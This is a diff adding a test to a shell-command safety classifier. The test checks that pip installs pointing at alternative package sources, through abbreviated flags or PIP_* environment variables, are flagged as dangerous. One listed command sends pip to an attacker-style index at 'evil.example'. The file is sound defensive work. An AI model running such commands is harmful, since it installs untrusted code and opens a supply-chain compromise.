@@ -474,6 +474,22 @@ class TestSafetyCoverageEdges:
             verdict = SafetyClassifier().classify(cmd)  # `-r i`: a requirements file named "i"
             assert verdict.level is RiskLevel.CAUTION, (cmd, verdict.reasons)
 
+    def test_a_pip_source_needs_a_tick_when_abbreviated_or_set_in_the_environment(self) -> None:
+        """pip's optparse takes any unambiguous prefix (`--find`, `--extra-ind=`) and reads every option
+        from `PIP_<NAME>` (or a `PIP_CONFIG_FILE`), so each of these names an index or links too."""
+        for cmd in ("pip install --find ./w pkg", "pip install --extra-ind=./w pkg", "pip install --inde ./w pkg",
+                    "pip3 install --fi=./w pkg", "PIP_INDEX_URL=https://evil.example/simple pip install x",
+                    "PIP_EXTRA_INDEX_URL=./w pip install x", "PIP_FIND_LINKS=./w pip install x",
+                    "env PIP_FIND_LINKS=./w pip install x", "export PIP_INDEX_URL=https://e/s; pip install x",
+                    "PIP_CONFIG_FILE=./p.conf pip install x"):
+            verdict = SafetyClassifier().classify(cmd)
+            assert verdict.level is RiskLevel.DANGEROUS, (cmd, verdict.reasons)
+        for cmd in ("pip install requests", "pip install -r requirements.txt", "pip install -e .",
+                    "pip install --upgrade x", "pip install --user x", "pip install --ignore-installed x",
+                    "pip install --force-reinstall x", "pip install --no-index x", "pip install -- x"):
+            verdict = SafetyClassifier().classify(cmd)
+            assert verdict.level is RiskLevel.CAUTION, (cmd, verdict.reasons)
+
     def test_an_apt_or_snap_install_from_a_non_default_source_needs_a_tick(self) -> None:
         """The escalation is not pip-only: a URL `.deb` and a snap sideload
         (`--dangerous`) are non-default sources that must ask too."""
